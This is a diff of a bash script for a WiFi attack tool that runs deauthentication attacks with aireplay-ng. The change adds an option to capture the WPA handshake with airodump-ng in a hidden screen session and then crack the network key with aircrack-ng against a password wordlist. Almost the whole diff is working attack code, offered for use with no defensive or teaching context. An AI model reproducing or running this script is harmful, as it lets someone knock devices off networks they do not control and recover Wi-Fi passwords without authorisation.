@@ -101,6 +101,8 @@ start () {
 	  echo ""
 		read -p "Enter number of requests: " number
 		echo ""
+		read -p "Try to crack WiFi password (y/n)? " capture
+		echo ""
 		deAuth
 	else
 		echo "-- New target --"
@@ -108,7 +110,8 @@ start () {
 		read -p "Client MAC address (leave empty for every device): " client
 		read -p "Channel: " channel
 		read -p "Number of de-auth request to send: " number
-		read -p "Save target for later (y/n)?" save
+		read -p "Try to crack WiFi password (y/n)? " capture
+		read -p "Save target for later (y/n)? " save
 
 		if [ "$save" == "y" ]
 			then
@@ -127,14 +130,36 @@ fi
 }
 
 deAuth () {
-  echo "-- Starting de-auth attack ($number requests) --"
   sudo airmon-ng start $interfaceMon $channel > /dev/null
+
+  if [ "$capture" == "y" ]
+  then
+  	echo "-- Starting handshake capture --"
+  	echo ""
+  	sudo rm capture-* --force
+  	screen -d -m sudo airodump-ng -d $ap -c $channel -w capture $interfaceMon > /dev/null
+  fi
+
+  echo "-- Starting de-auth attack ($number requests) --"
+	echo ""
+
 	if [ -z "$client" ]
 	then
 		sudo aireplay-ng -0 $number -a $ap $interfaceMon
 	else
 		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
 	fi
+
+	if [ "$capture" == "y" ]
+  then
+  	echo ""
+  	echo "-- Stopping handshake capture (10s) ---"
+  	sleep 10s
+		sudo killall screen
+		echo ""
+		echo "-- Cracking Wi-Fi key --"
+  	sudo aircrack-ng capture-01.cap -w pass.txt
+  fi
 
 	echo ""
 	read -p "${green}Attack completed. Press any key to continue...${reset}" blah
